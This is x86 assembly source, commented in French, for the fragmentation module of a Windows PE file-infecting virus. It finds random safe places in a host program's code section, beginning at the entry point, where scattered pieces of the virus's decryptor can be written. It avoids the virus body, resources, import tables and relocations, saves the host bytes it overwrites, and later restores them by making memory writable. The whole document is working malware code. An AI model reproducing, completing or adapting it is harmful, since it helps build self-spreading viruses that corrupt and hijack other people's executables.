   ;MODULE : FRAGMENTATION
   ;Ce module est chargé de trouver X parties de la section .code de l'hote qui peuvent être
   ;écrasées sans risque. Ces X parties seront écrasées par les X ilots du décrypteur. A la
   ;charge également de sauvegarder et restaurer le code de ces parties.


   ;trouve_adresse:  in: edx-->PE Header, table adresses_interdites remplie, esi->section header où la trouver
   ;                       ebx=taille à réserver
   ;                 out: eax=adresse raw trouvée 0 si aucune
   trouve_adresse proc near
           push ecx
           mov ecx,MAX_RETRY
   ta_1:
           mov eax,[esi+16]            ;27/12/07 : check avec la RawSize et pas la VSize !!!
           sub eax,ebx
           cmp eax,0
           jle ta_err
           call rand_tuna
           add eax,[esi+12]
           call est_adresse_valide
           jc ta_ok
           loop ta_1
   ta_err:
           xor eax,eax
   ta_ok:
           pop ecx
           ret
   trouve_adresse endp

   ;trouve_adresses:  in: edx-->PE Header, table adresses_interdites remplie,
   ;                       ecx = nombre de parties, ebx = taille des parties
   ;                  out: table locations remplie, eax=1 si ok
   ;
   trouve_adresses proc near
           push ebx ecx esi edi
           lea edi,[ebp+locations]
           mov eax,[edx+28h]                 ; première partie sur l'EP
           stosd
           call evite_adresse
           push eax
           mov eax,ebx
           stosd
           pop eax
           dec ecx
           jecxz ta_fini
           call section_info       ;eax-->.code header
           mov esi,eax
   tas_1:  call trouve_adresse
           test eax,eax
           jz ta_fin           ;pas trouvé
           stosd
           call evite_adresse
           mov eax,ebx
           stosd
           loop tas_1
   ta_fini:
           xor eax,eax
           stosd
           inc eax
   ta_fin:
           pop edi esi ecx ebx
           ret
   trouve_adresses endp



   ;EVITE_ADRESSES: ajoute les structures principales du Pe dans les adresses à éviter.
   ; in : edx--> PE header
   ;      ebx-->
   evite_adresses proc near
           pusha
           mov ecx,ebx
           mov eax,[ebp+infection_rva]  ; on ecrase pas notre propre code
           mov ebx,VIRTUAL_SIZE_VIRUS
           call evite_adresse
           mov eax,[edx+88h]            ; ni les ressources
           mov ebx,[edx+8Ch]
           call evite_adresse
           mov eax,[edx+80h]            ; ni l'IAT
           mov ebx,[edx+84h]
           call evite_adresse
                                        ; ni les idd de l'iat et tout ce qu'ils contienent
           call rva2raw
           lea edi,[eax+ecx]

   rtai_1:

           mov eax,[edi]
           test eax,eax                 ; OFT présent      ?
           jz rtai_2
           push eax                     ; evite l'OFT
           call rva2raw
           lea esi,[eax+ecx]
           call taille_liste
           pop eax
           call evite_adresse
           jmp rtai_3
   rtai_2:
           mov eax,[edi+10h]            ; FT present ?
           test eax,eax
           jz rtai_4                    ; fin des imports
   rtai_3:
           push eax                     ; evite le FT
           mov eax,[edi+10h]
           call rva2raw
           lea esi,[eax+ecx]
           call taille_liste
           mov eax,[edi+10h]
           call evite_adresse
           pop eax

           call rva2raw                 ; evite les IID
           add eax,ecx
           mov esi,eax
           call min_liste
           mov eax,ebx
           call max_liste
           sub ebx,eax
           add ebx,50
           call evite_adresse
           add edi,14h
           jmp rtai_1
   rtai_4:

           cmp [ebp+is_relocated],byte ptr 0
           jz ea_pas_relocated
           mov eax,[edx+0A0h]          ; evite les relocs
           mov ebx,[edx+0A4h]
           call evite_adresse
   ea_pas_relocated:
           popa
           ret
   evite_adresses endp


   ;EVITE_ADRESSE:  in: eax=RVA ebx=taille
   evite_adresse proc near
           pusha
           push eax
           mov edi,[ebp+adresses_interdites]
           add ebx,eax
           mov ecx,MAX_ENDROITS_INTERDIT
           xor eax,eax
           repnz scasd
           stosd
           pop eax
           mov [edi-8],eax
           mov [edi-8+MAX_ENDROITS_INTERDIT],ebx
           popa
           ret
   evite_adresse endp

   ;MIN_LISTE : in: esi->liste
   ;            out: ebx=min de la liste
   min_liste proc near
           push esi
           push eax
           xor ebx,ebx
           dec ebx
   ml_1:   lodsd
           test eax,eax
           jz ml_2
           cmp eax,ebx
           ja ml_1
           mov ebx,eax
           jmp ml_1
   ml_2:
           pop eax
           pop esi
           ret
   min_liste endp

   ;MAX_LISTE : in: esi->liste
   ;            out: ebx=max de la liste
   max_liste proc near
           push esi
           push eax
           xor ebx,ebx
   ma_1:   lodsd
           test eax,eax
           jz ma_2
           cmp eax,ebx
           jb ma_1
           mov ebx,eax
           jmp ma_1
   ma_2:
           pop eax
           pop esi
           ret
   max_liste endp

   ;TAILLE_LISTE : in: esi->liste  terminée par 0
   ;            out: ebx=taille de la liste
   taille_liste proc near
           push edi
           push eax
           mov edi,esi
           xor eax,eax
           xor ebx,ebx
   tl_1:
           inc ebx
           scasd
           jnz tl_1
           dec ebx
           shl ebx,2
           pop eax
           pop edi
           ret
   taille_liste endp


   ;EST_ADRESSE_VALIDE: regarde si l'adresse est dans la liste adresses_interdites
   ; in: eax=RVA ebx=taille de la zone
   ; out: carry bit vrai si ok
   est_adresse_valide proc near
           pusha
           mov ecx,eax
           jecxz eav_fin
           lea edx,[eax+ebx]
           mov esi,[ebp+adresses_interdites]
   eav_1:
           lodsd
           test eax,eax
           stc
           jz eav_fin
           cmp ecx,[esi-4+ MAX_ENDROITS_INTERDIT]
           ja eav_2
           cmp edx,eax
           jb eav_2
           clc
           jmp eav_fin
   eav_2:
           jmp eav_1
   eav_fin:
           popa
           ret
   est_adresse_valide endp


   ;SAUVEGARDE_HOTE : sauvegarde les parties de code de l'hote écrasées par le décrypteur
   ;                  juste avant le code du corps du virus
   ;in: table locations remplie, edx->pe header  ebx->filemapping
   ;out: code sauvegardé  avant le virus, dans l'ordre des locations
   sauvegarde_hote proc near
           pusha
           lea esi,[ebp+locations]
           mov edi,[ebp+infection_raw]
           add edi,TAILLE_IMPORTS
   sh_1:   lodsd
           test eax,eax
           jz sh_fin
           call rva2raw
           lea ecx,[eax+ebx]
           lodsd
           push esi
           mov esi,eax
           xchg ecx,esi
           rep movsb
           pop esi
           jmp sh_1
   sh_fin:
           popa
           ret
   sauvegarde_hote endp


   ;RESTORE_HOTE : in: table locations remplie, edx->pe header
   ; out : code de l'hote restauré là où il faut
   restaure_hote proc near
           pusha
           movzx ecx,byte ptr [ebp+sauve_nb_parties]
           mov ebx,[ebp+sauve_imagebase]
           lea esi,[ebp+sauve_locations]
           mov edx,[ebp+sauve_infection_rva]
           lea edx,[edx+ebx+TAILLE_IMPORTS]
   restore_1:
           lodsd
           test eax,eax
           jz restore_2
           lea edi,[eax+ebx]
           lodsd
           push ecx
           mov ecx,eax
           lea eax,[esp-4]

           pusha                   ; pour pouvoir ecrire dans la section
           push eax
           push dword ptr PAGE_EXECUTE_READWRITE
           push ecx
           push edi
           call_ VProtect
           popa

           push esi
           mov esi,edx
           rep movsb
           mov edx,esi
           pop esi
           pop ecx
           loop restore_1
   restore_2:
           popa
           ret
   restaure_hote endp
